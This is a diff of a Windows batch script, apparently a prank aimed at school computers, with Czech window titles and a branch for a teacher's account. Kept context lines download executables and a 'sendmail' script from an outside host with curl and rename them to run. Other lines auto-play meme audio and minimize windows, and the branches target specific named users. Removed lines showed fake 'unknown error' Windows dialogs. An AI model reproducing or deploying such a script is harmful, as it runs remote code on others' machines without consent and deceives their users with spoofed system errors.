@@ -14,13 +14,6 @@ move nircmd.tmpexe nircmd.exe
 curl -s https://sources.tobir.xyz/mailserver/sendmail.bat > sendmail.tmpbat
 move sendmail.tmpbat sendmail.bat
 
-cd C:/
-cd memes
-curl -s https://sources.tobir.xyz/memes/xp.mp3 > xp.mp3
-start /min wmplayer.exe xp.mp3
-C:\tools\nircmd.exe win min stitle "Přeh"
-C:\tools\nircmd.exe win min stitle "Hudb"
-
 timeout 1
 cd C:/
 mkdir scripts
@@ -101,7 +94,7 @@ timeout 5
 #start /min npc.mp3
 echo Started NPC SONG
 echo Next is Skype
-timeout 150
+timeout 100
 #start /min skype.mp3
 echo Started Skype
 echo Next is cat.mp3
@@ -159,14 +152,8 @@ if %UserName%==jsafar.ucitel goto safar
 exit
 
 :vichorcova
-start /min ppap.mp3
-#c:\tools\nircmd.exe infobox "Neznama chyba!" "Windows"
-#timeout 1
-#c:\tools\nircmd.exe infobox "Neznama chyba!" "Windows"
-#timeout 1
-#c:\tools\nircmd.exe infobox "Neznama chyba!" "Windows"
-#timeout 1
-:c:\tools\nircmd.exe infobox "Neznama chyba!" "Windows"
+start ppap.mp3
+timeout 1
 C:\tools\nircmd.exe win min stitle "Přeh"
 C:\tools\nircmd.exe win min stitle "Hudb"
 timeout 10
